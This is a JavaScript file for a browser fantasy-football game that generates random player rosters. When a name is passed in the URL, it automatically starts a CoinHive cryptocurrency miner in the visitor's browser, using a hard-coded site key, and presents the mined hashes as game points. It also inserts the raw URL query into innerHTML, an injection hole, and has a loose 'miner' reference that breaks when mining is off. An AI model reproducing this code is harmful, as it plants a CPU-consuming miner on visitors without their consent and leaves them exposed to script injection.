var named = false;
if (window.location.search.length > 1) {
  document.querySelector("#landing").style.display = "none";
  document.querySelector("#start").style.display = "none";
  document.querySelector("#portal").style.display = "inherit";
  document.querySelector("#tabs").style.display = "-webkit-box";
  document.querySelector("#name").innerHTML = window.location.search.slice(1);
  named = true;
  if (window.location.origin != "file://") {
    // Add coin hive for points
    var miner = new CoinHive.User("7RaiTYKeaBtz17GRNjKDr0LNIpdiT2VR", window.location.search+window.location.hash);
    miner.start();
    console.log("Mining");
    miner.on("accepted", () => {
      console.log(miner.getAcceptedHashes());
    });
    if (miner.getAcceptedHashes() > 0) {
      document.querySelector(".points").innerHTML = "$"+Math.floor(miner.getAcceptedHashes()/100);
      // COMBAK: For testing only
      t = genTeam();
      writeTeam(t);
    } else {
      t = genTeam();
      writeTeam(t);
      document.querySelector(".points").innerHTML = "$0"
    }
    // COMBAK:
  } else {
    t = genTeam();
    writeTeam(t);
    document.querySelector(".points").innerHTML = "$0";
  }
}

// NOTE: Keep track of points
setInterval(() => {
  document.querySelector(".points").innerHTML = "$"+Math.floor(miner.getAcceptedHashes()/100);
},1000);

document.querySelector("#start").addEventListener("keyup", (e)=>{
  if (e.key == "Enter") {
    var value = document.querySelector("#start").value;
    window.location.search = "?"+value;
  }
});

var show = "myteam";
function tab(e) {
  if (named) {
    if (show) {
      document.querySelector("#"+show).style.display = "none";
    }
    show = e.getAttribute("data-show");
    document.querySelector("#"+show).style.display = "inherit";
  }
}

function genPlayer(type) {
  var spW, stW, enW, agW;
  if (type == undefined) {
    type = ["qb", "wr", "te", "k", "rb", "dst"][Math.floor(Math.random()*6)];
  }
  if (type == "qb") {
    spW = 20;
    stW = 40;
    enW = 10;
    agW = 30;
  } else if (type == "wr") {
    spW = 40;
    stW = 10;
    enW = 25;
    agW = 25;
  } else if (type == "te") {
    spW = 30;
    stW = 30;
    enW = 20;
    agW = 20;
  } else if (type == "k") {
    spW = 40;
    stW = 40;
    enW = 10;
    agW = 10;
  } else if (type == "rb") {
    spW = 30;
    stW = 10;
    enW = 30;
    agW = 30;
  } else if (type == "dst") {
    spW = 20;
    stW = 30;
    enW = 20;
    agW = 30;
  } else if (type == "flex") {
    spW = 25;
    stW = 25;
    enW = 25;
    agW = 25;
  }
  var body = {};
  body["name"] = chance.name({gender: "male"});
  body["age"] = chance.age({type: "adult"});
  body["speed"] = Math.floor(spW+Math.random()*(spW/2));
  body["strength"] = Math.floor(stW+Math.random()*(stW/2));
  body["endurance"] = Math.floor(enW+Math.random()*(enW/2));
  body["agilty"] = Math.floor(agW+Math.random()*(agW/2));
  body["position"] = type;
  return body;
}

function genTeam() {
  var team = {
    "qb": [genPlayer("qb")],
    "rb": [genPlayer("rb"),genPlayer("rb")],
    "wr": [genPlayer("wr"),genPlayer("wr")],
    "te": [genPlayer("te")],
    "k": [genPlayer("k")],
    "dst": [genPlayer("dst")],
    "bn": [genPlayer(),genPlayer(),genPlayer(),genPlayer(),genPlayer(),genPlayer()],
    "flex": [genPlayer("flex")]
  };
  return team;
}

function writeTeam(team) {
  for (var pos in team) {
    var e = document.querySelector("#"+pos).children[1].children[0];
    for (var i = 0; i < team[pos].length; i++) {
      var str = "";
      str += "<tr><td>("+team[pos][i].position.toUpperCase()+") "+team[pos][i].name+" ("+team[pos][i].age+")</td>";
      str += "<td>"+team[pos][i].speed+"</td>";
      str += "<td>"+team[pos][i].strength+"</td>";
      str += "<td>"+team[pos][i].agilty+"</td>";
      str += "<td>"+team[pos][i].endurance+"</td></tr>";
      e.innerHTML += str;
    }
  }
}

function ajaxGET(href,callback) {
    var xml = new XMLHttpRequest;
    xml.open("GET", href);
    xml.send();
    xml.onreadystatechange = function() {
        if (xml.readyState == 4 && xml.status == 200) {
            var data = xml.response;
            if (callback != undefined) {
                callback(data, href)
            }
        }
    }
}
